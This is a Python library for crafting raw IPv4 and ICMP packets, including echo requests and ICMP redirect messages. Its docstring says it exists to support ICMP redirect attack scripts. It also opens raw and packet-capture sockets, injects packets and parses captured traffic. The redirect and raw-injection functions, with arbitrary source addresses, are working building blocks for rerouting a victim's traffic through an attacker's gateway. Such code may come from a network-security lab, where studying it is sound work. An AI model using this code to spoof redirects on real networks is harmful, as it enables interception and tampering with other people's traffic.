#!/usr/bin/env python3
"""
Common Packet Crafting Library for ICMP Redirect Attack
========================================================
This module provides low-level packet crafting functions using raw sockets.
It's designed to be imported by other attack scripts to avoid code duplication.
"""

import socket
import struct
import time

def checksum(data: bytes) -> int:
    """
    Compute Internet checksum for the given data.
    
    Args:
        data: Bytes to compute checksum for
        
    Returns:
        16-bit checksum value
    """
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def create_ip_header(src_ip: str, dst_ip: str, proto: int, payload_len: int, ttl: int = 64, ip_id: int = None) -> bytes:
    """
    Create an IP header with proper checksum.
    
    Args:
        src_ip: Source IP address (string)
        dst_ip: Destination IP address (string)  
        proto: Protocol number (1=ICMP, 6=TCP, 17=UDP)
        payload_len: Length of payload in bytes
        ttl: Time to Live (default 64)
        ip_id: IP identification field (default random)
        
    Returns:
        20-byte IP header
    """
    if ip_id is None:
        ip_id = int(time.time()) & 0xffff
        
    # IP header fields
    ip_ver_ihl = (4 << 4) | 5  # Version 4, IHL 5 words (20 bytes)
    ip_tos = 0  # Type of Service
    ip_tot_len = 20 + payload_len  # Total length (header + payload)
    ip_frag_off = 0  # Fragment offset
    ip_ttl = ttl  # Time to Live
    ip_proto = proto  # Protocol
    ip_check = 0  # Checksum (calculated later)
    ip_saddr = socket.inet_aton(src_ip)  # Source address
    ip_daddr = socket.inet_aton(dst_ip)  # Destination address

    # Pack the IP header
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        ip_ver_ihl, ip_tos, ip_tot_len,
        ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
        ip_saddr, ip_daddr
    )

    # Calculate and update the checksum
    ip_check = checksum(ip_header)
    ip_header = ip_header[:10] + struct.pack('!H', ip_check) + ip_header[12:]

    return ip_header

def create_icmp_echo_request(identifier: int = None, sequence: int = None, data: bytes = b'') -> bytes:
    """
    Create an ICMP echo request (ping) packet.
    
    Args:
        identifier: ICMP identifier (default random)
        sequence: ICMP sequence number (default random)
        data: Optional payload data
        
    Returns:
        ICMP echo request packet
    """
    if identifier is None:
        identifier = int(time.time()) & 0xffff
    if sequence is None:
        sequence = int(time.time()) & 0xffff
        
    icmp_type = 8  # Echo Request
    icmp_code = 0  # Standard code for echo request
    icmp_check = 0  # Checksum (calculated later)
    
    # Create the ICMP header
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, identifier, sequence)
    
    # Combine with data
    icmp_packet = icmp_header + data
    
    # Calculate and update the checksum
    icmp_check = checksum(icmp_packet)
    icmp_packet = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, identifier, sequence) + data
    
    return icmp_packet

def create_icmp_redirect(gateway_ip: str, original_packet: bytes) -> bytes:
    """
    Create an ICMP redirect message.
    
    Args:
        gateway_ip: IP address of the new gateway to redirect to
        original_packet: The original IP packet that triggered this redirect
        
    Returns:
        ICMP redirect packet
    """
    icmp_type = 5  # Redirect
    icmp_code = 1  # Redirect for host
    icmp_check = 0  # Checksum (calculated later)
    gateway = socket.inet_aton(gateway_ip)  # New gateway address
    
    # Per RFC 792, ICMP redirect contains the IP header + first 8 bytes of original datagram
    # Take at least 28 bytes (20 IP + 8 data) but no more than available
    original_data = original_packet[:min(28, len(original_packet))]
    if len(original_data) < 28:
        # Pad with zeros if original packet is too short
        original_data += b'\x00' * (28 - len(original_data))
    
    # Create the ICMP header
    icmp_header = struct.pack('!BBH4s', icmp_type, icmp_code, icmp_check, gateway)
    
    # Combine with original data
    icmp_packet = icmp_header + original_data
    
    # Calculate and update the checksum
    icmp_check = checksum(icmp_packet)
    icmp_packet = struct.pack('!BBH4s', icmp_type, icmp_code, icmp_check, gateway) + original_data
    
    return icmp_packet

def parse_ip_header(ip_packet: bytes) -> dict:
    """
    Parse an IP header and return key fields.
    
    Args:
        ip_packet: Raw IP packet bytes
        
    Returns:
        Dictionary with parsed IP header fields, or None if invalid
    """
    if len(ip_packet) < 20:
        return None
        
    try:
        # Unpack IP header
        iph = struct.unpack('!BBHHHBBH4s4s', ip_packet[:20])
        
        version_ihl = iph[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0xF
        
        if version != 4:  # Only IPv4 supported
            return None
            
        header_length = ihl * 4
        if header_length < 20 or header_length > len(ip_packet):
            return None
        
        protocol = iph[6]
        src_addr = socket.inet_ntoa(iph[8])
        dst_addr = socket.inet_ntoa(iph[9])
        
        return {
            'version': version,
            'header_length': header_length,
            'total_length': iph[2],
            'identification': iph[3],
            'ttl': iph[5],
            'protocol': protocol,
            'src': src_addr,
            'dst': dst_addr,
            'header_raw': ip_packet[:header_length],
            'payload': ip_packet[header_length:] if len(ip_packet) > header_length else b''
        }
    except (struct.error, socket.error):
        return None

def parse_icmp_header(icmp_packet: bytes) -> dict:
    """
    Parse an ICMP header and return key fields.
    
    Args:
        icmp_packet: Raw ICMP packet bytes
        
    Returns:
        Dictionary with parsed ICMP header fields, or None if invalid
    """
    if len(icmp_packet) < 8:
        return None
        
    try:
        icmp_type, icmp_code, icmp_checksum = struct.unpack('!BBH', icmp_packet[:4])
        
        result = {
            'type': icmp_type,
            'code': icmp_code,
            'checksum': icmp_checksum,
            'raw': icmp_packet
        }
        
        # Parse type-specific fields
        if icmp_type == 8 or icmp_type == 0:  # Echo Request/Reply
            if len(icmp_packet) >= 8:
                identifier, sequence = struct.unpack('!HH', icmp_packet[4:8])
                result['identifier'] = identifier
                result['sequence'] = sequence
                result['data'] = icmp_packet[8:]
        elif icmp_type == 5:  # Redirect
            if len(icmp_packet) >= 8:
                gateway = socket.inet_ntoa(icmp_packet[4:8])
                result['gateway'] = gateway
                result['original_packet'] = icmp_packet[8:]
                
        return result
    except (struct.error, socket.error):
        return None

def create_raw_socket(protocol: int = socket.IPPROTO_RAW) -> socket.socket:
    """
    Create a raw socket for packet injection.
    
    Args:
        protocol: Protocol to create socket for (default IPPROTO_RAW)
        
    Returns:
        Raw socket object
        
    Raises:
        socket.error: If socket creation fails
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, protocol)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return s
    except socket.error as e:
        raise socket.error(f"Failed to create raw socket: {e}")

def create_packet_socket(interface: str = None) -> socket.socket:
    """
    Create a packet socket for packet capture.
    
    Args:
        interface: Network interface to bind to (optional)
        
    Returns:
        Packet socket object
        
    Raises:
        socket.error: If socket creation fails
    """
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
        if interface:
            s.bind((interface, 0))
        return s
    except socket.error as e:
        raise socket.error(f"Failed to create packet socket: {e}")

def send_packet(packet: bytes, destination: str, source_port: int = 0) -> bool:
    """
    Send a raw IP packet to the specified destination.
    
    Args:
        packet: Complete IP packet to send
        destination: Destination IP address
        source_port: Source port (ignored for raw sockets)
        
    Returns:
        True if packet was sent successfully, False otherwise
    """
    try:
        with create_raw_socket() as s:
            s.sendto(packet, (destination, source_port))
        return True
    except socket.error as e:
        print(f"Failed to send packet: {e}")
        return False

def extract_ethernet_payload(frame: bytes) -> bytes:
    """
    Extract the IP payload from an Ethernet frame.
    
    Args:
        frame: Raw Ethernet frame
        
    Returns:
        IP packet bytes, or empty bytes if not IP
    """
    if len(frame) < 14:
        return b''
        
    # Check if it's an IP packet (EtherType 0x0800)
    eth_type = struct.unpack('!H', frame[12:14])[0]
    if eth_type == 0x0800:  # IPv4
        return frame[14:]
    return b''

def create_ping_packet(src_ip: str, dst_ip: str, identifier: int = None, sequence: int = None, data: bytes = b'HelloWorld') -> bytes:
    """
    Create a complete ICMP ping packet (IP + ICMP).
    
    Args:
        src_ip: Source IP address
        dst_ip: Destination IP address
        identifier: ICMP identifier (default random)
        sequence: ICMP sequence (default random)
        data: Ping data payload
        
    Returns:
        Complete IP + ICMP packet ready to send
    """
    icmp_packet = create_icmp_echo_request(identifier, sequence, data)
    ip_header = create_ip_header(src_ip, dst_ip, 1, len(icmp_packet))
    return ip_header + icmp_packet

def is_icmp_packet(ip_packet: bytes) -> bool:
    """
    Check if an IP packet contains ICMP payload.
    
    Args:
        ip_packet: IP packet bytes
        
    Returns:
        True if packet is ICMP, False otherwise
    """
    ip_header = parse_ip_header(ip_packet)
    return ip_header is not None and ip_header['protocol'] == 1

def print_packet_summary(ip_packet: bytes, prefix: str = "") -> None:
    """
    Print a human-readable summary of an IP packet.
    
    Args:
        ip_packet: IP packet to summarize
        prefix: Optional prefix for output lines
    """
    ip_header = parse_ip_header(ip_packet)
    if not ip_header:
        print(f"{prefix}Invalid IP packet")
        return
        
    proto_name = {1: "ICMP", 6: "TCP", 17: "UDP"}.get(ip_header['protocol'], f"Proto-{ip_header['protocol']}")
    print(f"{prefix}{ip_header['src']} → {ip_header['dst']} ({proto_name}, {ip_header['total_length']} bytes)")
    
    if ip_header['protocol'] == 1 and ip_header['payload']:  # ICMP
        icmp_header = parse_icmp_header(ip_header['payload'])
        if icmp_header:
            icmp_types = {0: "Echo Reply", 8: "Echo Request", 5: "Redirect"}
            icmp_type_name = icmp_types.get(icmp_header['type'], f"Type-{icmp_header['type']}")
            print(f"{prefix}  ICMP: {icmp_type_name} (code {icmp_header['code']})")
            
            if icmp_header['type'] == 5:  # Redirect
                print(f"{prefix}  New Gateway: {icmp_header.get('gateway', 'unknown')}")
